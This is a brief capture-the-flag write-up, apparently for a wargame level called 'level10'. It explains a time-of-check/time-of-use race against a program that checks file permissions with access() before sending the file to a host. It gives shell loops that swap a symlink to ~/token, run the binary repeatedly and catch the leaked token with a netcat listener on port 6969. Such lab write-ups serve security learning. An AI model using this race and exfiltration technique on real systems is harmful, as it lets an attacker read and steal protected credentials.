the programe send file to host add after send it check the permission by acces so we create a tmp file give it to acces and then we link it with token to read it
`while true; do ln -s /tmp/a /tmp/b; rm -f /tmp/b; ln -s ~/token /tmp/b; rm -f /tmp/b ; done`

launch a loop to execute file 
`while true; do ./level10 /tmp/b  ${host}; done`

Listen to 6969
` while true; do nc -l 6969; done`